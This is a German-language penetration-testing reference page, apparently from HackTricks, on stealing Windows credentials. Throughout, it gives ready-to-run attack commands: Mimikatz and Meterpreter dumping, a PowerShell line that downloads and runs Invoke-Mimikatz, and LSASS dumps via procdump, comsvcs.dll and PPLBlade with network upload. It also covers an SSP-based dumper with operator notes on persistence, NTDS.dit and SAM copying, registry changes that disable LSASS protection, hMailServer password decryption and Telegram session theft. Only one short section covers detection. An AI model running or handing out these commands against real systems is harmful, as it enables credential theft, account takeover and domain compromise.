# Windows-Anmeldedaten stehlen

{{#include ../../banners/hacktricks-training.md}}

## Anmeldedaten mit Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Finde heraus, was Mimikatz sonst noch kann, auf** [**dieser Seite**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Erfahre hier mehr über einige mögliche Schutzmaßnahmen für Zugangsdaten.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten Mimikatz daran hindern, einige Zugangsdaten auszulesen.**

## Zugangsdaten mit Meterpreter

Verwende das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um **im Opfer nach Passwörtern und Hashes zu suchen**.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV umgehen

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool ist**, wird es von Defender nicht erkannt.\
Mit diesem Tool kannst du **den lsass-Prozess dumpen**, **den Dump herunterladen** und **die Zugangsdaten lokal** aus dem Dump **extrahieren**.

Du kannst auch [SharpDump](https://github.com/GhostPack/SharpDump) verwenden.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Dieser Prozess wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) ausgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Manche **AV** können den Einsatz von **procdump.exe zum Dumpen von lsass.exe** als **bösartig erkennen**, weil sie die Zeichenfolgen **„procdump.exe“ und „lsass.exe“** **erkennen**. Daher ist es **unauffälliger**, als **Argument** die **PID** von lsass.exe an procdump zu **übergeben**, **anstatt** den **Namen lsass.exe** zu verwenden.

### Dumpen von lsass mit **comsvcs.dll**

Eine DLL namens **comsvcs.dll** in `C:\Windows\System32` ist dafür zuständig, bei einem Absturz den **Prozessspeicher zu dumpen**. Diese DLL enthält eine **Funktion** namens **`MiniDumpW`**, die mit `rundll32.exe` aufgerufen werden kann.\
Die ersten beiden Argumente sind irrelevant, das dritte ist jedoch in drei Komponenten unterteilt. Die Prozess-ID des zu dumpenden Prozesses bildet die erste Komponente, der Speicherort der Dump-Datei die zweite und die dritte Komponente muss genau das Wort **full** sein. Es gibt keine alternativen Optionen.\
Nachdem diese drei Komponenten verarbeitet wurden, erstellt die DLL die Dump-Datei und überträgt den Speicher des angegebenen Prozesses in diese Datei.\
**comsvcs.dll** kann zum Dumpen des lsass-Prozesses verwendet werden. Dadurch ist es nicht erforderlich, procdump hochzuladen und auszuführen. Diese Methode wird ausführlich unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) beschrieben.<sup>[[9]](#references)</sup>

Zur Ausführung wird folgender Befehl verwendet:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Diesen Prozess kannst du mit** [**lssasy**](https://github.com/Hackndo/lsassy)** automatisieren.**

### **lsass mit Task-Manager dumpen**

1. Klicke mit der rechten Maustaste auf die Taskleiste und dann auf Task-Manager.
2. Klicke auf Weitere Details.
3. Suche im Tab „Prozesse“ nach dem Prozess „Local Security Authority Process“.
4. Klicke mit der rechten Maustaste auf den Prozess „Local Security Authority Process“ und dann auf „Abbilddatei erstellen“.

### lsass mit procdump dumpen

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei, die Teil der [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-Suite ist.

Ein bereits vorhandener vollständiger System-Crash-Dump oder eine komprimierte Kopie in einem zugänglichen Benutzerordner kann Zugangsdaten für eine Offline-Analyse enthalten. Dateinamen wie `MEMORY.DMP` und `MEMORY.7z` sind lediglich Ansatzpunkte für die Überprüfung: Verifiziere Herkunft und Zugriff und gehe nicht davon aus, dass sie verwendbare oder aktuelle Zugangsdaten enthalten.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping von lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein Dumper-Tool für geschützte Prozesse, das den Speicher-Dump verschleiern und auf Remote-Workstations übertragen kann, ohne ihn auf der Festplatte abzulegen.

**Hauptfunktionen**:

1. Umgehen des PPL-Schutzes
2. Verschleiern von Speicher-Dump-Dateien, um signaturbasierte Erkennungsmechanismen von Defender zu umgehen
3. Hochladen des Speicher-Dumps mit RAW- und SMB-Upload-Methoden, ohne ihn auf der Festplatte abzulegen (fileless Dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP-basiertes LSASS-Dumping ohne MiniDumpWriteDump

Ink Dragon verwendet einen dreistufigen Dumper namens **LalsDumper**, der niemals `MiniDumpWriteDump` aufruft. Daher werden EDR-Hooks für diese API nie ausgelöst:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – durchsucht `fdp.dll` nach einem Platzhalter aus 32 kleingeschriebenen `d`-Zeichen, überschreibt ihn mit dem absoluten Pfad zu `rtu.txt`, speichert die gepatchte DLL als `nfdp.dll` und ruft `AddSecurityPackageA("nfdp","fdp")` auf. Dadurch wird **LSASS** gezwungen, die schädliche DLL als neuen Security Support Provider (SSP) zu laden.
2. **Stage 2 inside LSASS** – wenn LSASS `nfdp.dll` lädt, liest die DLL `rtu.txt`, XORt jedes Byte mit `0x20` und mappt den decodierten Blob in den Speicher, bevor sie die Ausführung übergibt.
3. **Stage 3 dumper** – das gemappte Payload implementiert die MiniDump-Logik mithilfe von **direct syscalls** neu, die anhand gehashter API-Namen aufgelöst werden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ein dedizierter Export namens `Tom` öffnet `%TEMP%\<pid>.ddt`, schreibt einen komprimierten LSASS-Dump in die Datei und schließt das Handle, damit die Exfiltration später erfolgen kann.

Hinweise für Bediener:

* Bewahre `lals.exe`, `fdp.dll`, `nfdp.dll` und `rtu.txt` im selben Verzeichnis auf. Stage 1 ersetzt den hartcodierten Platzhalter durch den absoluten Pfad zu `rtu.txt`. Werden die Dateien getrennt, wird die Kette unterbrochen.
* Die Registrierung erfolgt durch Anhängen von `nfdp` an `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Du kannst diesen Wert selbst eintragen, damit LSASS den SSP bei jedem Start erneut lädt.
* `%TEMP%\*.ddt`-Dateien sind komprimierte Dumps. Dekomprimiere sie lokal und übergib sie dann zur Credential-Extraktion an Mimikatz/Volatility.
* Zum Ausführen von `lals.exe` sind Admin-/SeTcb-Rechte erforderlich, damit `AddSecurityPackageA` erfolgreich ist. Sobald der Aufruf zurückkehrt, lädt LSASS transparent den rogue SSP und führt Stage 2 aus.
* Das Entfernen der DLL von der Festplatte wirft sie nicht aus LSASS. Lösche entweder den Registrierungseintrag und starte LSASS neu (Neustart) oder belasse sie für langfristige Persistenz.

## CrackMapExec

### SAM-Hashes dumpen

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA-Secrets dumpen

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### NTDS.dit vom Ziel-DC dumpen

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Den Passwortverlauf aus der NTDS.dit des Ziel-DC dumpen

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Das pwdLastSet-Attribut für jedes NTDS.dit-Konto anzeigen

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM & SYSTEM stehlen

Diese Dateien sollten sich unter _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM_ befinden. Sie lassen sich jedoch **nicht einfach auf herkömmliche Weise kopieren**, da sie geschützt sind.

### Über die Registrierung

Am einfachsten lassen sich diese Dateien stehlen, indem man eine Kopie aus der Registrierung erstellt:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Lade** diese Dateien auf deinen Kali-Rechner herunter und **extrahiere die Hashes** mit:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Mit diesem Dienst können Sie geschützte Dateien kopieren. Sie müssen Administrator sein.

#### Using vssadmin

Die Binärdatei vssadmin ist nur in Windows-Server-Versionen verfügbar.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Aber du kannst dasselbe auch mit **Powershell** machen. Dies ist ein Beispiel dafür, **wie du die SAM-Datei kopierst** (das verwendete Laufwerk ist „C:“ und die Datei wird unter C:\users\Public gespeichert). Du kannst damit aber jede geschützte Datei kopieren:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code aus dem Buch: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Schließlich kannst du auch das [**PS-Skript Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory-Anmeldedaten – NTDS.dit**

Die Datei **NTDS.dit** gilt als das Herzstück von **Active Directory** und enthält wichtige Daten zu Benutzerobjekten, Gruppen und deren Mitgliedschaften. Hier werden die **Passworthashes** der Domänenbenutzer gespeichert. Diese Datei ist eine Datenbank der **Extensible Storage Engine (ESE)** und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

In dieser Datenbank werden drei Haupttabellen verwaltet:

- **Datentabelle**: In dieser Tabelle werden Details zu Objekten wie Benutzern und Gruppen gespeichert.
- **Verknüpfungstabelle**: Sie erfasst Beziehungen, etwa Gruppenmitgliedschaften.
- **SD-Tabelle**: Hier werden **Sicherheitsdeskriptoren** für jedes Objekt gespeichert, um die Sicherheit und Zugriffskontrolle der gespeicherten Objekte zu gewährleisten.

Christoffer Anderssons Forschung auf Datenbankebene dokumentiert diese Tabellen und ihr versionsspezifisches Verhalten ausführlicher.<sup>[[8]](#references)</sup>

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ verwendet. Daher kann sich ein **Teil** der Datei **NTDS.dit** im Arbeitsspeicher von **`lsass`** befinden (wahrscheinlich sind dort die zuletzt abgerufenen Daten zu finden, da zur Leistungsverbesserung ein **Cache** verwendet wird).

#### Entschlüsseln der Hashes in NTDS.dit

Der Hash wird dreimal verschlüsselt:

1. Den Password Encryption Key (**PEK**) mithilfe des **BOOTKEY** und **RC4** entschlüsseln.
2. Den **Hash** mithilfe des **PEK** und **RC4** entschlüsseln.
3. Den **Hash** mithilfe von **DES** entschlüsseln.

Der **PEK** hat auf allen Domänencontrollern denselben Wert, ist aber in **NTDS.dit** mit dem domänencontrollerspezifischen **BOOTKEY** aus der **SYSTEM**-Hive dieses Domänencontrollers verschlüsselt. Zum Extrahieren der Anmeldedaten werden daher sowohl **NTDS.dit** als auch **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) benötigt.

### NTDS.dit mit Ntdsutil kopieren

Seit Windows Server 2008 verfügbar.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Sie können auch den Trick mit der [**volume shadow copy**](#stealing-sam-and-system) verwenden, um die Datei **ntds.dit** zu kopieren. Denken Sie daran, dass Sie auch eine Kopie der **SYSTEM-Datei** benötigen (verwenden Sie erneut den Trick, sie [**aus der Registry zu dumpen oder die volume shadow copy zu verwenden**](#stealing-sam-and-system)).

### **Hashes aus NTDS.dit extrahieren**

Sobald Sie die Dateien **NTDS.dit** und **SYSTEM** **erhalten** haben, können Sie Tools wie _secretsdump.py_ verwenden, um die **Hashes zu extrahieren**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Du kannst sie auch automatisch mit einem gültigen Domain-Admin-Benutzer extrahieren:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Für **große NTDS.dit-Dateien** wird empfohlen, sie mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich kannst du auch das **Metasploit-Modul** _post/windows/gather/credentials/domain_hashdump_ oder **mimikatz** `lsadump::lsa /inject` verwenden.

### **Extrahieren von Domänenobjekten aus NTDS.dit in eine SQLite-Datenbank**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur Secrets extrahiert, sondern auch die gesamten Objekte und ihre Attribute, um weitere Informationen zu extrahieren, sobald die rohe NTDS.dit-Datei bereits abgerufen wurde.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

The `SYSTEM`-Hive ist optional, ermöglicht aber die Entschlüsselung von Secrets (NT- und LM-Hashes, ergänzende Anmeldedaten wie Klartextpasswörter, Kerberos- oder Trust-Keys, NT- und LM-Passworthistorien). Neben anderen Informationen werden folgende Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel der letzten Anmeldung und Passwortänderung, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, der Baum der Organisationseinheiten und deren Mitgliedschaften, vertrauenswürdige Domänen mit Trust-Typ, Richtung und Attributen ...

## Lazagne

Lade die Binärdatei [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Mit dieser Binärdatei kannst du Credentials aus verschiedenen Softwareprogrammen extrahieren.

```
lazagne.exe all
```

## Weitere Tools zum Extrahieren von Anmeldedaten aus SAM und LSASS

### Windows credentials Editor (WCE)

Mit diesem Tool können Anmeldedaten aus dem Speicher extrahiert werden. Laden Sie es hier herunter: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Anmeldedaten aus der SAM-Datei extrahieren

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Anmeldedaten aus der SAM-Datei extrahieren

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Lade es hier herunter: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) und **führe es einfach aus**. Die Passwörter werden dann extrahiert.

## Inaktive RDP-Sitzungen auswerten und Sicherheitskontrollen schwächen

Ink Dragons FinalDraft RAT enthält einen `DumpRDPHistory`-Tasker, dessen Techniken für jeden Red-Teamer nützlich sind:<sup>[[3]](#references)</sup>

### Telemetrie im Stil von DumpRDPHistory erfassen

* **Ausgehende RDP-Ziele** – durchsuche jeden Benutzer-Hive unter `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Jeder Unterschlüssel speichert den Servernamen, `UsernameHint` und den Zeitstempel der letzten Änderung. Du kannst die Logik von FinalDraft mit PowerShell nachbilden:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Eingehende RDP-Nachweise** – frage das Protokoll `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` nach den Ereignis-IDs **21** (erfolgreiche Anmeldung) und **25** (Verbindung getrennt) ab, um nachzuvollziehen, wer den Rechner verwaltet hat:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Sobald du weißt, welcher Domain Admin sich regelmäßig verbindet, dump LSASS (mit LalsDumper/Mimikatz), solange seine **getrennte** Sitzung noch besteht. CredSSP + NTLM-Fallback hinterlässt seinen Verifier und seine Tokens in LSASS. Diese können dann über SMB/WinRM wiederverwendet werden, um `NTDS.dit` abzugreifen oder Persistenz auf Domaincontrollern einzurichten.

### Registry-Downgrades, auf die FinalDraft abzielt

Dieselbe Implantat manipuliert außerdem mehrere Registry-Schlüssel, um den Diebstahl von Zugangsdaten zu erleichtern:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` erzwingt die vollständige Wiederverwendung von Anmeldedaten/Tickets während RDP und ermöglicht Pivoting im Pass-the-Hash-Stil.
* `LocalAccountTokenFilterPolicy=1` deaktiviert die UAC-Tokenfilterung, sodass lokale Administratoren über das Netzwerk uneingeschränkte Tokens erhalten.
* `DSRMAdminLogonBehavior=2` ermöglicht dem DSRM-Administrator die Anmeldung, während der DC online ist, und bietet Angreifern damit ein weiteres integriertes Konto mit hohen Berechtigungen.
* `RunAsPPL=0` entfernt den LSASS-PPL-Schutz und macht den Speicherzugriff für Dump-Tools wie LalsDumper trivial.

## hMailServer-Konfigurationsanmeldedaten (nach einer Kompromittierung)

Prüfen Sie die genauen Konfigurationsdateien `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` und `C:\ProgramData\hMailServer\hMailServer.ini`, abhängig vom Installationslayout. Ein lesbarer, nicht leerer Wert für `[Security] AdministratorPassword=` ist ein hMailServer-Administrationspasswort-Hash; er ist kein Beleg für ein Windows-Administratorpasswort. Wird diese Anmeldeinformation wiederhergestellt, erfordert jedes Pivoting zu einem Windows-Konto eine unabhängig verifizierte Wiederverwendung des Passworts und entsprechende Anmelderechte.

Bei Installationen mit einer SQL CE-Datenbank schützt der separate Wert `[Database] Password=` in der INI-Datei die Datenbank. In älteren Installationen ist dieser Wert Blowfish-verschlüsselt, und zwar mit dem statischen Schlüssel `THIS_KEY_IS_NOT_SECRET` und 4-Byte-Wort-Endianness-Tausch. Verwenden Sie den Hex-String aus der INI-Datei mit diesem Python-Snippet:<sup>[[2]](#references)</sup>

Vergewissern Sie sich zunächst, dass das aktuelle Konto sowohl die INI-Datei als auch die zugehörige SQL CE-`.sdf`-Datenbank lesen kann. Das INI-Passwort schützt die Datenbank; es ist von den darin gespeicherten Hashes der Postfachkonten getrennt. Untersuchen oder aktualisieren Sie eine **Kopie** einer verwendeten Datenbank, niemals die aktive Datei.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Mit dem Klartextpasswort die SQL-CE-Datenbank kopieren, um Dateisperren zu vermeiden, den 32-Bit-Provider laden und bei Bedarf ein Upgrade durchführen, bevor Hashes abgefragt werden:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Die Spalte `accountpassword` verwendet das hMailServer-Hash-Format (hashcat mode `1421`). Ein geknacktes Mailbox-Passwort ermöglicht nur dann einen Windows-Benutzer-Pivot, wenn ein lokales/Domänenkonto dasselbe Passwort verwendet und dieses Konto über die erforderlichen Rechte für Remote-Logons verfügt.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Manche Tools erfassen **Klartext-Logon-Passwörter**, indem sie den LSA-Logon-Callback `LsaApLogonUserEx2` abfangen. Dabei wird der Callback des Authentifizierungspakets gehookt oder umschlossen, um Zugangsdaten **während des Logons** (vor dem Hashing) zu erfassen und anschließend auf die Festplatte zu schreiben oder an den Operator zurückzugeben. Dies wird üblicherweise mithilfe eines Helpers umgesetzt, der in LSA injiziert oder dort registriert wird und dann jedes erfolgreiche interaktive/Netzwerk-Logon-Ereignis mit Benutzername, Domäne und Passwort protokolliert.<sup>[[1]](#references)</sup>

Hinweise zum Betrieb:
- Erfordert lokale Admin-/SYSTEM-Rechte, um den Helper in den Authentifizierungspfad zu laden.
- Erfasste Zugangsdaten werden nur bei einem Logon sichtbar (interaktiver Logon, RDP-, Dienst- oder Netzwerk-Logon, je nach Hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) speichert gespeicherte Verbindungsinformationen in einer benutzerspezifischen `sqlstudio.bin`-Datei. Spezielle Dumper können die Datei parsen und gespeicherte SQL-Zugangsdaten wiederherstellen. In Shells, die nur Befehlsausgaben zurückgeben, wird die Datei häufig per Base64 kodiert und auf stdout ausgegeben.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Auf der Operator-Seite die Datei neu erstellen und den Dumper lokal ausführen, um Zugangsdaten wiederherzustellen:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Browser-Sitzungs- und Cookie-Diebstahl über das Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Diebstahl von Telegram-Desktop-`tdata`-Sitzungen

Telegram Desktop speichert Autorisierungs- und Kontodaten in seinem **`tdata`**-Verzeichnis. Eine kopierte Sitzung kann mit kompatiblen Tools geladen werden, um sich ohne Kontopasswort zu authentifizieren, solange diese Autorisierung gültig ist. Ist die Verschlüsselung lokaler Daten aktiviert, benötigt der Stealer außerdem den Passcode. Eine authentifizierte Sitzung kann anschließend Identitätsdaten, Metadaten zu Dialogen und Mitgliedschaften, Nachrichten sowie herunterladbare Medien offenlegen.<sup>[[10]](#references)</sup>

### Erkennung und Beschaffung

Durchsuche sowohl installierte als auch portable Verzeichnisstrukturen. Die Namen von Microsoft-Store-Paketen variieren, daher solltest du Paketverzeichnisse mit `TelegramMessenge` auflisten und deren Unterverzeichnis `LocalCache\Roaming` überprüfen.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Wenn gewöhnliche Lesezugriffe fehlschlagen und das Prozesstoken `SeBackupPrivilege` **bereits enthält und aktiviert**, bietet ein backupbewusster Zugriff eine Ausweichmöglichkeit; er verschafft dem Prozess weder das Privileg noch erhöht er seine Berechtigungen. `CreateFileW` mit `FILE_FLAG_BACKUP_SEMANTICS` kann Backup-/Restore-Semantik anfordern und Dateisicherheitsprüfungen umgehen, wenn die erforderlichen Tokenprivilegien vorhanden sind. Das Flag allein umgeht jedoch keine inkompatible Freigabesperre.<sup>[[10]](#references)[[11]](#references)</sup>

Erstelle/lies bei live gesperrten Dateien eine **Volume Shadow Copy**; bei durch ACLs blockierten Dateien verwendet `robocopy /B` den Backup-Modus und umgeht Datei- und Verzeichnis-ACLs.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Ein bandbreitenbewusstes Implantat übermittelt möglicherweise zunächst nur das Datei-Pfadverzeichnis, erhält eine Snapshot-Kennung sowie die Pfade, die bereits beim C2 gespeichert sind, und lädt nur fehlende Dateien hoch. Daher können auch kleine inkrementelle Übertragungen nach einer rekursiven `tdata`-Auflistung auf einen erfolgreichen Sitzungsdiebstahl hindeuten.<sup>[[10]](#references)</sup>

### Erkennung und Eindämmung

Setze den rekursiven Zugriff auf `tdata` durch einen Nicht-Telegram-Prozess mit der Aktivierung von `SeBackupPrivilege`, Dateiöffnungen mit Backup-Semantik, VSS-Aktivitäten oder einem untergeordneten `robocopy.exe` mit `/B` in Beziehung. Suche außerdem nach einer schnellen Auflistung sowohl von `%APPDATA%` als auch von `%LOCALAPPDATA%\Packages`, gefolgt von ausgehenden Verbindungen desselben Prozesses. Beende nach einer Kompromittierung unter **Einstellungen → Geräte** (oder **Datenschutz & Sicherheit → Aktive Sitzungen**) nicht erkannte Sitzungen. Die Aktivierung der Bestätigung in zwei Schritten allein widerruft keine bereits gestohlene Autorisierung.<sup>[[10]](#references)[[13]](#references)</sup>

## Diebstahl von Passkeys / WebAuthn-Anmeldedaten aus Chrome unter Windows

Wenn auf einem Windows-Host mit **Chrome + in Google Password Manager synchronisierten Passkeys** Code als **Opferbenutzer** ausgeführt werden kann, sind Passkeys ein interessantes Ziel für die Post-Exploitation – sogar **ohne Admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante lokale Artefakte

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

